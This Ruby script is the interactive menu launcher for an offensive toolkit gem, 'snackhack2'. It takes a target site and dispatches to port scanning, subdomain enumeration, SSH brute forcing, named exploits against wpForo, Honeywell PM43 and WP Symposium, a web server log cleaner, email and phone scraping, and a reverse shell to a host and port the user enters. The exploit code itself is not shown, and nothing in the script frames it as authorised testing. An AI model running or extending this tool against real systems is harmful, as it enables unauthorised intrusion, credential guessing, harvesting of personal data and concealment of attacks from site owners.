require 'snackhack2'
require 'colorize'
puts "\e[H\e[2J"

banner = %Q{

███████ ███    ██  █████   ██████ ██   ██ ██   ██  █████   ██████ ██   ██ ██████
██      ████   ██ ██   ██ ██      ██  ██  ██   ██ ██   ██ ██      ██  ██       ██
███████ ██ ██  ██ ███████ ██      █████   ███████ ███████ ██      █████    █████
     ██ ██  ██ ██ ██   ██ ██      ██  ██  ██   ██ ██   ██ ██      ██  ██  ██
███████ ██   ████ ██   ██  ██████ ██   ██ ██   ██ ██   ██  ██████ ██   ██ ███████



}
puts banner.colorize(:blue)
while true

  options = %Q{
  1) Port Scan
  2) Robots.txt
  3) WordPress
  4) Drupal
  5) Google Analytics
  6) SiteMap
  7) Subdomain
  8) Subdomains2
  9) TomCat
  10) Website Links
  11) SSH Brute
  12) WebSite Meta
  13) wpForo_Forum Exploit
  14) Honeywell_PM43 Exploit
  15) IP LookUp
  16) Crypto Extractor from WebSite
  17) WP_Symposium Exploit
  18) WebServer Log Cleaner
  19) Scrape Emails from Site
  20) Scrape Phone Numbers from Site
  21) Reverse Shell
  }
  print(options)
  print("Enter Number: ")

  num = gets.chomp

  print("Enter Site: ")
  site = gets.chomp
  print("\n\n\n")
  case num.to_i
  when 1
    tcp = Snackhack2::PortScan.new(site).run
  when 2
    ip = Snackhack2::Robots.new(site, save_file: true).run
  when 3
    Snackhack2::WordPress.new(site).run
  when 4
    Snackhack2::Drupal.new(site).all
  when 5
    Snackhack2::GoogleAnalytics.new(site).run
  when 6
    Snackhack2::SiteMap.new(site).run
  when 7
    Snackhack2::Subdomains.new(site).run
  when 8
    Snackhack2::Subdomains2.new(site).run
  when 9
    Snackhack2::TomCat.new(site).run
  when 10
    Snackhack2::WebsiteLinks.new(site).run
  when 11
    Snackhack2::SSHBute.new(site).run
  when 12
    Snackhack2::WebsiteMeta.new(site).run
  when 13
    Snackhack2::WPForoForum.new(site).run
  when 14
    Snackhack2::HoneywellPM43.new(site).run
  when 15
    Snackhack2::IpLookup.new(site).run
  when 16
    Snackhack2::CryptoExtractWebsite.new(site).run
  when 17
    Snackhack2::WPSymposium.new(site).run
  when 18
    Snackhack2::WebServerCleaner.new(site).run
  when 19
    Snackhack2::Email.new(site).run
  when 20
    Snackhack2::PhoneNumber.new(site).spider
  when 21
    print("Enter Port: ")
    port=gets.chomp
    Snackhack2::ReverseShell.new(site, port).run
  end
end

puts "\e[H\e[2J"
